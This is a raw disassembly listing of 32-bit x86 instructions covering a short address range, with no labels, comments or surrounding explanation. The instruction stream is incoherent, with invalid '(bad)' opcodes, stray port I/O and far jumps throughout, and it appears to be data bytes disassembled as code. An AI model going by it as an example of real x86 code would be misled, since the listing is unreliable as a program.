  4253a8:	mov    eax,0xfa17ddbd
  4253ad:	mov    esi,0xfa6c7176
  4253b2:	cmp    edx,eax
  4253b4:	sub    DWORD PTR [eax],eax
	...
  425416:	inc    edx
  425417:	or     esp,eax
  425419:	test   eax,0xeb6fedcf
  42541e:	out    0xf4,eax
  425420:	xchg   al,bl
  425422:	push   ebx
  425423:	cmp    al,0x51
  425425:	daa    
  425426:	cld    
  425427:	mov    WORD PTR [ecx],es
  425429:	add    BYTE PTR [edi],al
  42542b:	add    DWORD PTR [eax],eax
  42542d:	add    BYTE PTR [ebp+0x24],dl
  425430:	mov    ecx,0x15b0f181
  425435:	arpl   WORD PTR [eax-0xe5e8247],cx
  42543b:	ins    DWORD PTR es:[edi],dx
  42543c:	push   edx
  42543d:	out    0x32,eax
  42543f:	inc    DWORD PTR [edi-0x7e1b0bed]
  425445:	pop    ebx
  425446:	(bad)  
  425447:	leave  
  425448:	mov    ebp,0x1e5748b7
  42544d:	jge    0x4253f9
  42544f:	dec    edi
  425450:	xchg   edx,eax
  425451:	retf   0x375b
  425454:	call   0x1b98:0xd7f50a58
  42545b:	adc    BYTE PTR [ecx-0x63],bh
  42545e:	lahf   
  42545f:	aam    0x90
  425461:	inc    ebx
  425462:	fsub   QWORD PTR [ebx-0x50]
  425465:	mov    ?,ecx
  425467:	imul   edi,edx,0xd56ba50d
  42546d:	and    edx,DWORD PTR [edi+esi*1]
  425470:	jle    0x425476
  425472:	jns    0x42541a
  425474:	push   edi
  425475:	cmp    DWORD PTR [ebp-0x71],0xdd005f89
  42547c:	lock bnd jo 0x4254ae
  425480:	mov    ds:0x3fa888a4,al
  425485:	inc    esp
  425486:	fmul   st,st(4)
  425488:	sahf   
  425489:	nop
  42548a:	pop    ss
  42548b:	mov    bl,BYTE PTR [edx]
  42548d:	push   ds
  42548e:	cmp    esi,DWORD PTR [edx+0x6cbe0634]
  425494:	stos   DWORD PTR es:[edi],eax
  425495:	and    BYTE PTR [edx+0x75c518e2],dh
  42549b:	pop    esi
  42549c:	mov    edx,DWORD PTR [edx+eax*4-0x16a172f]
  4254a3:	les    eax,FWORD PTR [ebp-0x57]
  4254a6:	xchg   esp,eax
  4254a7:	sub    DWORD PTR [edx+0x6a],ebp
  4254aa:	pop    esi
  4254ab:	dec    ebp
  4254ac:	js     0x42548b
  4254ae:	cmp    al,0xbb
  4254b0:	cdq    
  4254b1:	fimul  WORD PTR [edi]
  4254b3:	or     al,0x4
  4254b5:	ror    DWORD PTR [ebp-0x2d],0x2c
  4254b9:	add    BYTE PTR [edi+0xa23f334],ah
  4254bf:	pusha  
  4254c0:	and    BYTE PTR [ecx+0xbadb193],cl
  4254c6:	mov    eax,0x79cb8121
  4254cb:	sti    
  4254cc:	cmp    edx,DWORD PTR [edx+0x366d19b]
  4254d2:	aad    0x14
  4254d4:	call   0x8f6f2aa0
  4254d9:	pusha  
  4254da:	jbe    0x425533
  4254dc:	dec    ebx
  4254dd:	add    ecx,edi
  4254df:	adc    eax,0xac09342
  4254e4:	daa    
  4254e5:	xor    ebp,DWORD PTR [ecx]
  4254e7:	mov    bl,0xd6
  4254e9:	sub    esi,edi
  4254eb:	ins    BYTE PTR es:[edi],dx
  4254ec:	cmc    
  4254ed:	push   es
  4254ee:	sbb    esi,DWORD PTR [eax+eiz*1+0x7a1b0e3]
  4254f5:	jecxz  0x425518
  4254f7:	test   ecx,esi
  4254f9:	js     0x425546
  4254fb:	sub    BYTE PTR [esi-0x1e850030],ah
  425501:	sbb    BYTE PTR [edi-0x46],bh
  425504:	fisttp DWORD PTR [ebx]
  425506:	loopne 0x425508
  425508:	leave  
  425509:	mov    BYTE PTR [eax],al
  42550b:	pop    eax
  42550c:	hlt    
  42550d:	ret    
  42550e:	fsub   QWORD PTR [ecx+0x1b]
  425511:	std    
  425512:	pop    edx
  425513:	and    al,0x74
  425515:	mov    ah,0xa2
  425517:	or     al,0x4f
  425519:	daa    
  42551a:	lods   al,BYTE PTR ds:[esi]
  42551b:	mov    eax,0x1820bb57
  425520:	int    0x73
  425522:	cs inc esp
  425524:	xchg   ecx,eax
  425525:	(bad)  
  425526:	pop    ebx
  425527:	fs cs aas 
  42552a:	iret   
  42552b:	(bad)  
  42552c:	fcomp  QWORD PTR [edi+0x5587e13]
  425532:	push   ss
  425533:	mov    ds:0xfb,eax
	...
  425594:	add    BYTE PTR [eax],al
  425596:	(bad)  
  425597:	jmp    0xfef4:0xfe6e7a4e
  42559e:	dec    esp
  42559f:	push   ecx
  4255a0:	ret    0xf1c6
  4255a3:	js     0x4255ba
  4255a5:	add    eax,0x18e03
  4255aa:	pop    es
  4255ab:	add    DWORD PTR [eax],eax
  4255ad:	add    BYTE PTR [ecx],bh
  4255af:	test   eax,0xd7a4bad3
  4255b4:	pop    ds
  4255b5:	(bad)
  4255b9:	mov    esi,0x5a9e784e
  4255be:	outs   dx,BYTE PTR ds:[esi]
  4255bf:	shr    dh,0x5
  4255c2:	popf   
  4255c3:	loop   0x4255ce
  4255c5:	jae    0x4255e5
  4255c7:	add    BYTE PTR [eax-0x30],cl
  4255ca:	sahf   
  4255cb:	add    edi,DWORD PTR [esi-0x75]
  4255ce:	push   0x56
  4255d0:	sbb    DWORD PTR [eax+0x698f5ca6],edi
  4255d6:	push   ebp
  4255d7:	dec    ebx
  4255d8:	inc    ecx
  4255d9:	jbe    0x42563d
  4255db:	sub    ebx,DWORD PTR [ecx-0x15]
  4255de:	repnz mov esi,0xdc6776fe
  4255e4:	pushf  
  4255e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4255e6:	loope  0x4255dc
  4255e8:	jg     0x425574
  4255ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4255eb:	jmp    0xa480:0x99da208d
  4255f2:	dec    eax
  4255f3:	jne    0x42564f
  4255f5:	lods   eax,DWORD PTR ds:[esi]
  4255f6:	int3   
  4255f7:	pop    DWORD PTR [ecx-0x4f]
  4255fa:	clc    
  4255fb:	push   esp
  4255fc:	out    dx,eax
  4255fd:	cmp    dh,BYTE PTR [edx-0x2509d877]
  425603:	scas   al,BYTE PTR es:[edi]
  425604:	cli    
  425605:	dec    ebx
  425606:	fwait
  425607:	arpl   ax,si
  425609:	cmp    edi,DWORD PTR [ecx-0x3cc20c79]
  42560f:	mov    esp,0x20206997
  425614:	inc    esi
  425615:	and    eax,0x828ab6fe
  42561a:	bound  edi,QWORD PTR [ecx+0x41]
  42561d:	mov    edx,0x18e0ce63
  425622:	fist   DWORD PTR [edi+0x75]
  425625:	lods   al,BYTE PTR ds:[esi]
  425626:	daa    
  425627:	push   edi
  425628:	push   edi
  425629:	pop    ebp
  42562a:	div    bl
  42562c:	and    BYTE PTR [ecx],dh
  42562e:	jecxz  0x425624
  425630:	stc    
  425631:	pop    ds
  425632:	pop    esp
  425633:	push   0xffffff9e
  425635:	les    ecx,FWORD PTR [edx+0x2e]
  425638:	stos   BYTE PTR es:[edi],al
  425639:	push   edx
  42563a:	jecxz  0x425683
  42563c:	xchg   esi,eax
  42563d:	and    eax,0x7ce281e1
  425642:	out    0xf8,al
  425644:	test   eax,0xf9c9a1b3
  425649:	mov    esi,0xc3f05bb8
  42564e:	fstp   DWORD PTR [edi+0x47077c8e]
  425654:	(bad)  
  425655:	out    dx,eax
  425656:	std    
  425657:	push   ds
  425658:	test   eax,0x9ecf80a
  42565d:	push   ebp
  42565e:	pop    ecx
  42565f:	je     0x42569e
  425661:	sub    bl,BYTE PTR [ebx]
  425663:	(bad)  
  425664:	xchg   ebx,eax
  425665:	jecxz  0x4256c1
  425667:	nop
  425668:	dec    eax
  425669:	fmul   st,st(6)
  42566b:	jmp    0xbcb4:0x484af633
  425672:	push   0xbddff74c
  425677:	inc    ebp
  425678:	sub    al,0x3f
  42567a:	cmp    BYTE PTR [edx],dh
  42567c:	xor    ch,dl
  42567e:	adc    cl,BYTE PTR [edx+ecx*2]
  425681:	ds jbe 0x42568d
  425684:	outs   dx,DWORD PTR ds:[esi]
  425685:	scas   eax,DWORD PTR es:[edi]
  425686:	dec    edi
  425687:	cli    
  425688:	fldenv gs:[ecx+edi*4+0x339faa05]
  425690:	pop    ecx
  425691:	xchg   BYTE PTR [eax-0x29],bl
  425694:	int3   
  425695:	lock mov ds:0x88a9b2e4,eax
  42569b:	jge    0x425679
  42569d:	xchg   esp,eax
  42569e:	sub    eax,DWORD PTR [eax+0xe22c3f7]
  4256a4:	pop    esi
  4256a5:	pop    eax
  4256a6:	mov    eax,ds:0x9c8dbf9
  4256ab:	js     0x42568d
  4256ad:	fs pop edi
  4256af:	stc    
  4256b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256b1:	shl    dh,cl
  4256b3:	sub    BYTE PTR [ecx+0x0],0x0
	...
  425713:	add    BYTE PTR [eax],al
  425715:	add    dh,dl
  425717:	aaa    
  425718:	shl    BYTE PTR [ebx+esi*8],cl
  42571b:	cmc    
  42571c:	div    bh
  42571e:	mov    dl,0x28
  425720:	shr    DWORD PTR [ebx-0x75f4e500],cl
  425726:	or     cl,BYTE PTR [edi+0x1070001]
  42572c:	add    BYTE PTR [eax],al
  42572e:	adc    eax,0x26679d0
  425733:	xor    eax,0x80bd4e1d
  425738:	sbb    BYTE PTR [edi],0x21
  42573b:	cli    
  42573c:	js     0x425798
  42573e:	int    0xf7
  425740:	aad    0x68
  425742:	sbb    DWORD PTR [eax],ebx
  425744:	into   
  425745:	mov    ds:0xa031a15,eax
  42574a:	push   ebp
  42574b:	mov    esi,0x4e17c617
  425750:	jno    0x42575f
  425752:	sub    BYTE PTR [ecx+edx*2],ch
  425755:	stos   DWORD PTR es:[edi],eax
  425756:	test   esi,esi
  425758:	jns    0x4257d9
  42575a:	lods   al,BYTE PTR ds:[esi]
  42575b:	pusha  
  42575c:	mov    al,ds:0x7108b13d
  425761:	outs   dx,BYTE PTR ds:[esi]
  425762:	jbe    0x425752
  425764:	push   0x79
  425766:	xchg   esi,eax
  425767:	data16 into 
  425769:	aad    0x88
  42576b:	lea    ebx,[ecx]
  42576d:	lods   al,BYTE PTR ds:[esi]
  42576e:	test   BYTE PTR [eax],al
  425770:	dec    ecx
  425771:	ret    0xcf51
  425774:	push   ebp
  425775:	add    eax,edx
  425777:	(bad)  
  425778:	jl     0x42579a
  42577a:	xchg   ebp,eax
  42577b:	scas   eax,DWORD PTR es:[edi]
  42577c:	dec    esi
  42577d:	int    0x63
  42577f:	push   ss
  425780:	test   BYTE PTR [eax],dl
  425782:	xchg   edi,eax
  425783:	sub    esi,edx
  425785:	inc    esi
  425786:	shl    ecx,0xfa
  425789:	pop    edx
  42578a:	inc    edi
  42578b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42578c:	push   ecx
  42578d:	xchg   esi,eax
  42578e:	jmp    0x4257b3
  425790:	mov    DWORD PTR [edx-0x2f],ebp
  425793:	jae    0x4257c5
  425795:	in     eax,0x1c
  425797:	mov    cl,0x41
  425799:	cmp    cl,BYTE PTR [ebp-0x63]
  42579c:	dec    ebp
  42579d:	push   ebp
  42579e:	push   es
  42579f:	and    eax,0x4149f46a
  4257a4:	xchg   dl,bl
  4257a6:	push   ss
  4257a7:	(bad)  
  4257a8:	xchg   edx,eax
  4257a9:	sub    cl,BYTE PTR [ecx*8+0x1f42125c]
  4257b0:	ficomp WORD PTR [ebp+0x2702d151]
  4257b6:	adc    cl,BYTE PTR ds:0x69418b27
  4257bc:	cdq    
  4257bd:	mov    ecx,0x9e80a41b
  4257c2:	ror    DWORD PTR [esi-0x7bb5e5f2],1
  4257c8:	inc    ecx
  4257c9:	mov    ah,0xa3
  4257cb:	out    0x2b,eax
  4257cd:	cwde   
  4257ce:	mov    eax,0xc99cad7e
  4257d3:	lock add dh,BYTE PTR [ebp-0x5d]
  4257d7:	mov    esi,0x62fb1e82
  4257dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257dd:	pop    DWORD PTR [eax-0x6e]
  4257e0:	mov    ah,BYTE PTR [eax-0x40]
  4257e3:	outs   dx,BYTE PTR ds:[esi]
  4257e4:	fsubr  QWORD PTR [ebp+0x4]
  4257e7:	dec    ecx
  4257e8:	inc    ebp
  4257e9:	mov    ecx,0x4e15ec0c
  4257ee:	pop    ss
  4257ef:	inc    esi
  4257f0:	adc    esp,DWORD PTR [edx-0xe51e30a]
  4257f6:	push   edx
  4257f7:	popf   
  4257f8:	idiv   BYTE PTR [edi]
  4257fa:	inc    eax
  4257fb:	xor    edi,0xffffffbf
  4257fe:	or     bh,ch
  425800:	mov    ds:0x62ded054,al
  425805:	jmp    0x4257b0
  425807:	cdq    
  425808:	adc    al,BYTE PTR ds:0x4f609de9
  42580e:	in     eax,dx
  42580f:	xlat   BYTE PTR ds:[ebx]
  425810:	in     al,dx
  425811:	jae    0x42588d
  425813:	out    0xd0,al
  425815:	xor    BYTE PTR [ecx+ecx*2-0x1a],bl
  425819:	shl    ebp,cl
  42581b:	and    BYTE PTR [edi+edi*8+0x24df386f],dl
  425822:	push   0xa106ab13
  425827:	inc    ecx
  425828:	dec    ebx
  425829:	(bad)  [esp+edx*4]
  42582c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42582d:	jbe    0x42580a
  42582f:	scas   eax,DWORD PTR es:[edi]
  425830:	int    0xe4
  425832:	adc    al,BYTE PTR [ecx+0x79]
	...
  425895:	add    BYTE PTR [edx+edx*2-0x70],bl
  425899:	push   edx
  42589a:	sahf   
  42589b:	rcr    dh,cl
  42589d:	pop    esi
  42589e:	inc    eax
  42589f:	scas   eax,DWORD PTR es:[edi]
  4258a0:	stc    
  4258a1:	mov    ds:0xd87bf075,al
  4258a6:	adc    DWORD PTR [eax+0x1070001],edx
  4258ac:	add    BYTE PTR [eax],al
  4258ae:	shl    BYTE PTR [ecx],1
  4258b0:	ins    BYTE PTR es:[edi],dx
  4258b1:	ret    0xaace
  4258b4:	mov    edx,0xf670e601
  4258b9:	imul   edx,DWORD PTR [ecx+0x1015583b],0x10
  4258c0:	leave  
  4258c1:	mov    es,WORD PTR [ecx-0x2f]
  4258c4:	dec    esp
  4258c5:	mov    bl,0xc1
  4258c7:	sti    
  4258c8:	mov    BYTE PTR [edx+0x1f],al
  4258cb:	ds jp  0x42591d
  4258ce:	push   ebx
  4258cf:	sbb    ebx,DWORD PTR [esi-0x77900c06]
  4258d5:	test   eax,0x167549d6
  4258da:	stos   DWORD PTR es:[edi],eax
  4258db:	jnp    0x4258ec
  4258dd:	sub    eax,0x15fab372
  4258e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4258e3:	mov    eax,ecx
  4258e5:	popa   
  4258e6:	es aad 0x55
  4258e9:	cs imul ebp,ebx,0xffffff90
  4258ed:	or     BYTE PTR [ecx+esi*8-0x6a80cecb],0xc
  4258f5:	repnz mov ecx,edx
  4258f8:	inc    esp
  4258f9:	cwde   
  4258fa:	fmul   DWORD PTR [ecx]
  4258fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4258fd:	pop    edx
  4258fe:	jne    0x4258d7
  425900:	rcr    ah,1
  425902:	push   ebp
  425903:	cmp    eax,0x73b2457f
  425908:	arpl   WORD PTR cs:[eax+ebp*8],ax
  42590c:	loopne 0x425951
  42590e:	adc    dl,BYTE PTR [ecx+0x72b2d3db]
  425914:	xor    DWORD PTR [ebp-0x11],edx
  425917:	aad    0x60
  425919:	aas    
  42591a:	inc    ebp
  42591b:	ins    BYTE PTR es:[edi],dx
  42591c:	test   eax,0x462343e1
  425921:	dec    esp
  425922:	inc    edx
  425923:	mov    esi,eax
  425925:	scas   eax,DWORD PTR es:[edi]
  425926:	xor    BYTE PTR [ecx+0x1465f516],cl
  42592c:	adc    eax,0x33f78874
  425931:	js     0x42596a
  425933:	call   0x22c2:0xf59ecc23
  42593a:	xchg   ah,cl
  42593c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42593d:	in     eax,0xe4
  42593f:	sbb    ch,bh
  425941:	mov    ah,0x6c
  425943:	adc    DWORD PTR [edi],0xffffffdb
  425946:	jl     0x4259ac
  425948:	lods   eax,DWORD PTR ds:[esi]
  425949:	fnstenv [edx-0x5c0ce420]
  42594f:	jg     0x4259ce
  425951:	cmp    eax,0xd575d098
  425956:	xlat   BYTE PTR ds:[ebx]
  425957:	xchg   edx,eax
  425958:	xchg   BYTE PTR [esi+0x13555192],ah
  42595e:	test   DWORD PTR [edx],edi
  425960:	sar    ah,cl
  425962:	xchg   esp,eax
  425963:	jle    0x4258f2
  425965:	mov    eax,ds:0xe7051ada
  42596a:	mov    eax,ds:0xe2078234
  42596f:	(bad)  
  425970:	out    dx,eax
  425971:	xchg   DWORD PTR [ecx+0x26],esp
  425974:	jge    0x4259ca
  425976:	ret    
  425977:	sahf   
  425978:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425979:	call   0x2f82:0xe962d1b5
  425980:	jmp    0xd22a:0xe63e0faa
  425987:	add    edi,ebp
  425989:	imul   edx,edi,0xffffffee
  42598c:	sbb    DWORD PTR [edi+0x66af0b26],edx
  425992:	js     0x4259ee
  425994:	mov    ecx,0xf8ba8c22
  425999:	(bad)  
  42599a:	sbb    eax,0x446960b3
  42599f:	clc    
  4259a0:	shl    DWORD PTR [ecx-0x70],1
  4259a3:	test   eax,0x34a363f6
  4259a8:	jno    0x4259d4
  4259aa:	add    DWORD PTR [eax-0x1d],ecx
  4259ad:	loopne 0x425a0c
  4259af:	xchg   BYTE PTR [edi],al
  4259b1:	mov    bh,0x9c
  4259b3:	cmp    BYTE PTR [ebp+0x0],0x0
	...
  425a13:	add    BYTE PTR [eax],al
  425a15:	add    cl,al
  425a17:	arpl   WORD PTR [edi+eiz*2],ax
  425a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1b:	jcxz   0x425a05
  425a1e:	mov    edi,0xea10fe11
  425a24:	sub    al,0xc6
  425a26:	sbb    BYTE PTR [ecx+0x1070001],dl
  425a2c:	add    BYTE PTR [eax],al
  425a2e:	and    eax,0x76ba9498
  425a33:	push   0xb5b6bde0
  425a38:	cmp    BYTE PTR [esi-0xf],bh
  425a3b:	lahf   
  425a3c:	dec    ebx
  425a3d:	push   cs
  425a3e:	test   eax,0x8ebbcd6b
  425a43:	xchg   BYTE PTR [esi*2+0x4099a0f0],ch
  425a4a:	xchg   edi,eax
  425a4b:	mov    dl,BYTE PTR [ecx]
  425a4d:	dec    esp
  425a4e:	sti    
  425a4f:	in     al,dx
  425a50:	push   edx
  425a51:	gs mov ebx,0xf2ded93c
  425a57:	sti    
  425a58:	inc    ecx
  425a59:	jp     0x4259f3
  425a5b:	fcmovb st,st(5)
  425a5d:	xor    DWORD PTR [esi],ebp
  425a5f:	popf   
  425a60:	cdq    
  425a61:	xchg   edi,eax
  425a62:	mov    al,es:0xcb848ed2
  425a68:	adc    ebx,DWORD PTR [ebx-0x53]
  425a6b:	lock scas al,BYTE PTR es:[edi]
  425a6d:	mov    dh,BYTE PTR [esp-0x8]
  425a71:	lahf   
  425a72:	loopne 0x425a5a
  425a74:	jecxz  0x425a86
  425a76:	stos   DWORD PTR es:[edi],eax
  425a77:	in     al,dx
  425a78:	test   al,0xe
  425a7a:	popf   
  425a7b:	adc    eax,0x882441d7
  425a80:	mov    dh,0xcc
  425a82:	fstp   DWORD PTR [ebx-0x28]
  425a85:	jle    0x425aa1
  425a87:	xchg   ebp,eax
  425a88:	not    DWORD PTR [edi]
  425a8a:	mov    al,0x4d
  425a8c:	std    
  425a8d:	cmp    eax,0x26a10b00
  425a92:	jmp    0xf4c0f874
  425a97:	mov    esi,edi
  425a99:	shr    cl,1
  425a9b:	mov    dl,BYTE PTR [edi+0x6f3c6d62]
  425aa1:	addr16 pop ds
  425aa3:	fcom   QWORD PTR [esi]
  425aa5:	push   esi
  425aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425aa7:	cmp    BYTE PTR [edx+0x21],bl
  425aaa:	jnp    0x425a5c
  425aac:	or     eax,0xe188e1c7
  425ab1:	pop    es
  425ab2:	inc    ebp
  425ab3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425ab4:	xor    eax,0x7c7dd215
  425ab9:	push   0x37
  425abb:	lahf   
  425abc:	xor    DWORD PTR [eax+0x3831e15a],eax
  425ac2:	ins    DWORD PTR es:[edi],dx
  425ac3:	ror    DWORD PTR [edx+0x66],cl
  425ac6:	jmp    FWORD PTR [edx-0x5]
  425ac9:	sbb    cl,BYTE PTR [ecx]
  425acb:	data16 std 
  425acd:	not    BYTE PTR [esi+0x43]
  425ad0:	aas    
  425ad1:	data16 (bad) 
  425ad3:	sub    ebx,ebp
  425ad5:	inc    esp
  425ad6:	jb     0x425b22
  425ad8:	dec    eax
  425ad9:	repnz sbb edx,DWORD PTR es:[ecx-0x4efc06e6]
  425ae1:	and    ecx,0xa00c1ab
  425ae7:	cld    
  425ae8:	pushf  
  425ae9:	fdiv   QWORD PTR [esi+0x6a74eac9]
  425aef:	adc    al,0x74
  425af1:	test   DWORD PTR [ebx+0x55fa9004],0x16509bef
  425afb:	mov    edi,0x6d64691a
  425b00:	and    dh,BYTE PTR [eax-0x44]
  425b03:	jb     0x425b63
  425b05:	cmc    
  425b06:	sub    BYTE PTR [esi-0x26],ch
  425b09:	sahf   
  425b0a:	in     eax,dx
  425b0b:	(bad)  
  425b0c:	in     eax,0x1
  425b0e:	addr16 and eax,0x2fbb6da8
  425b14:	ds push ds
  425b16:	(bad)  
  425b17:	and    edi,ebp
  425b19:	loope  0x425b0a
  425b1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425b1c:	retf   0xa7b7
  425b1f:	shl    BYTE PTR [edi],1
  425b21:	test   eax,0xd0f311a0
  425b26:	xchg   ecx,eax
  425b27:	rcr    DWORD PTR [esi+0x4266860b],cl
  425b2d:	mov    dh,0x7d
  425b2f:	into   
  425b30:	or     BYTE PTR [edi+0xb3439f],ah
	...
  425b96:	(bad)  
  425b97:	clc    
  425b98:	jnp    0x425bf0
  425b9a:	jg     0x425b73
  425b9c:	in     eax,dx
  425b9d:	cli    
  425b9e:	push   0x2a5aad3
  425ba3:	push   0x921f8287
  425ba8:	add    DWORD PTR [eax],eax
  425baa:	pop    es
  425bab:	add    DWORD PTR [eax],eax
  425bad:	add    BYTE PTR [esp+eax*4-0x3fd710ec],bl
  425bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425bb5:	ja     0x425bdf
  425bb7:	(bad)  
  425bb8:	cmp    edi,DWORD PTR [edi*1-0x6cd9fd3f]
  425bbf:	imul   ebp,DWORD PTR [eax],0xfffffffa
  425bc2:	add    al,0xd1
  425bc4:	cmp    al,BYTE PTR [edx]
  425bc6:	lods   eax,DWORD PTR ds:[esi]
  425bc7:	sbb    eax,0x7691f137
  425bcc:	add    DWORD PTR [edi-0x49],esi
  425bcf:	push   ds
  425bd0:	and    esp,DWORD PTR [eax+0x2a]
  425bd3:	fwait
  425bd4:	xlat   BYTE PTR ds:[ebx]
  425bd5:	xor    bh,dl
  425bd7:	fisubr DWORD PTR [edi+edi*1]
  425bda:	mov    ds:0xfcf83f5c,al
  425bdf:	daa    
  425be0:	cld    
  425be1:	jg     0x425be4
  425be3:	cmp    eax,0x2c30ee85
  425be8:	bound  esp,QWORD PTR [esi-0x356226dc]
  425bee:	push   ds
  425bef:	dec    ebp
  425bf0:	inc    ebp
  425bf1:	ret    0xda11
  425bf4:	add    edi,esi
  425bf6:	push   cs
  425bf7:	xchg   edi,eax
  425bf8:	nop
  425bf9:	lea    eax,[ebp-0x75]
  425bfc:	aam    0x4f
  425bfe:	ja     0x425bb7
  425c00:	mov    ds:0x51320d01,al
  425c05:	sbb    BYTE PTR [ebp+0x2dc47069],0xe3
  425c0c:	push   edx
  425c0d:	dec    ebp
  425c0e:	adc    BYTE PTR [ecx+0x5a],al
  425c11:	mov    dl,0x49
  425c13:	ret    
  425c14:	xor    eax,0xcba53e86
  425c19:	inc    esi
  425c1a:	sahf   
  425c1b:	pop    es
  425c1c:	push   esp
  425c1d:	rol    BYTE PTR [edi],cl
  425c1f:	and    DWORD PTR [ecx-0x6cdb0908],edx
  425c25:	inc    edi
  425c26:	out    0xeb,al
  425c28:	fs cwde 
  425c2a:	xor    edi,eax
  425c2c:	pop    ebx
  425c2d:	sahf   
  425c2e:	not    DWORD PTR [ebp+0x424707e5]
  425c34:	mov    BYTE PTR [ebp+0x69],bl
  425c37:	pop    ds
  425c38:	in     al,dx
  425c39:	stc    
  425c3a:	fsubr  DWORD PTR [esi-0x1a411dd1]
  425c40:	pop    esi
  425c41:	imul   BYTE PTR [ebx-0x4ad6ffed]
  425c47:	adc    al,0xd3
  425c49:	daa    
  425c4a:	pop    ebx
  425c4b:	std    
  425c4c:	lods   al,BYTE PTR ds:[esi]
  425c4d:	pop    ebx
  425c4e:	(bad)  
  425c4f:	mov    ch,0x15
  425c51:	dec    ecx
  425c52:	pop    ss
  425c53:	xlat   BYTE PTR ds:[ebx]
  425c54:	call   0xa8f4ddf5
  425c59:	retf   
  425c5a:	lahf   
  425c5b:	in     al,dx
  425c5c:	jb     0x425bf8
  425c5e:	mov    ch,0x94
  425c60:	and    eax,0xdd0542bf
  425c65:	adc    al,0x23
  425c67:	xchg   ebx,edx
  425c69:	push   0x3f9b6186
  425c6e:	xchg   ecx,eax
  425c6f:	inc    eax
  425c70:	sahf   
  425c71:	fxch   st(4)
  425c73:	ror    BYTE PTR fs:0x4bc00ac6,0x13
  425c7b:	sbb    ah,BYTE PTR [edx]
  425c7d:	test   DWORD PTR [eax+0x5ad9c427],0x48db500e
  425c87:	jmp    0xc669:0x340cb854
  425c8e:	ja     0x425d02
  425c90:	lea    ebx,ds:0xd5d28e4d
  425c96:	sar    DWORD PTR [esi+0x47],cl
  425c99:	sub    ecx,DWORD PTR [eax]
  425c9b:	jb     0x425c7f
  425c9d:	fdivr  DWORD PTR [ecx]
  425c9f:	stos   BYTE PTR es:[edi],al
  425ca0:	pop    edi
  425ca1:	repnz mov ?,WORD PTR [edi-0x4b37f385]
  425ca8:	add    eax,0x55340e7c
  425cad:	cmp    DWORD PTR [esi+0x1fe26c24],0xe9c5
	...
  425d13:	add    BYTE PTR [eax],al
  425d15:	add    bh,bh
  425d17:	lods   al,BYTE PTR ds:[esi]
  425d18:	fadd   QWORD PTR [edi]
  425d1a:	fbstp  TBYTE PTR [edi-0x1]
  425d1d:	cld    
  425d1e:	fidiv  DWORD PTR [esi+0xd]
  425d21:	in     al,0x6f
  425d23:	mov    esp,0x93264268
  425d28:	add    DWORD PTR [eax],eax
  425d2a:	pop    es
  425d2b:	add    DWORD PTR [eax],eax
  425d2d:	add    BYTE PTR [ebx+0x33],cl
  425d30:	mov    ah,BYTE PTR [esi-0x5439f076]
  425d36:	clc    
  425d37:	dec    ecx
  425d38:	nop
  425d39:	push   cs
  425d3a:	jg     0x425da3
  425d3c:	fs imul ecx,edx,0xffffff98
  425d40:	sub    DWORD PTR ss:[eax+ebp*2+0x6d],0x9dc94004
  425d49:	fdivr  QWORD PTR [ebx+0x5e]
  425d4c:	int3   
  425d4d:	daa    
  425d4e:	jae    0x425d22
  425d50:	pop    ss
  425d51:	fwait
  425d52:	je     0x425d39
  425d54:	push   0xf206ed2b
  425d59:	adc    eax,0x8c3463fb
  425d5e:	add    DWORD PTR [eax],0x1d0e4bc7
  425d64:	inc    esi
  425d65:	div    BYTE PTR [eax]
  425d67:	add    BYTE PTR [edx+0x5107c6bf],0x76
  425d6e:	pop    edx
  425d6f:	cmp    eax,0x4c9dbb92
  425d74:	xchg   ecx,eax
  425d75:	arpl   WORD PTR [esi+0x7c],dx
  425d78:	test   edi,edi
  425d7a:	add    dl,dh
  425d7c:	test   BYTE PTR [esp+ebp*1],ah
  425d7f:	sti    
  425d80:	cli    
  425d81:	inc    edx
  425d82:	aad    0xdb
  425d84:	fmul   DWORD PTR [esi]
  425d86:	or     al,0x4e
  425d88:	and    BYTE PTR [esi+0x5240438],bl
  425d8e:	and    DWORD PTR [esi-0x6dc59a23],ebx
  425d94:	mov    ds:0xc32b0bfb,eax
  425d99:	lods   al,BYTE PTR ds:[esi]
  425d9a:	in     eax,0x60
  425d9c:	add    ah,BYTE PTR [ebp+ebp*4+0x67]
  425da0:	jge    0x425e11
  425da2:	sahf   
  425da3:	aad    0xe9
  425da5:	ja     0x425df5
  425da7:	push   esi
  425da8:	mov    al,ds:0x95f77842
  425dad:	leave  
  425dae:	sahf   
  425daf:	mov    dh,0xf9
  425db1:	into   
  425db2:	push   0x35871d26
  425db7:	aam    0xe4
  425db9:	inc    eax
  425dba:	dec    eax
  425dbb:	jb     0x425df6
  425dbd:	jo     0x425dd3
  425dbf:	sub    eax,0x26c535f8
  425dc4:	xchg   ecx,eax
  425dc5:	push   ss
  425dc6:	mov    edx,0xc94a0787
  425dcb:	fst    DWORD PTR [ecx]
  425dcd:	dec    eax
  425dce:	push   esi
  425dcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425dd0:	jmp    0x5dc0:0x67fc9e4c
  425dd7:	pop    ss
  425dd8:	sub    eax,0xe5b9d7fe
  425ddd:	es stos BYTE PTR es:[edi],al
  425ddf:	int3   
  425de0:	xchg   edi,eax
  425de1:	xchg   ebx,eax
  425de2:	in     al,0x58
  425de4:	inc    esi
  425de5:	(bad)  
  425de6:	mov    WORD PTR [edx+eiz*8+0x17],ss
  425dea:	dec    esp
  425deb:	lods   eax,DWORD PTR ds:[esi]
  425dec:	mov    bl,0x4d
  425dee:	popf   
  425def:	pusha  
  425df0:	mov    ecx,0xc30cbddb
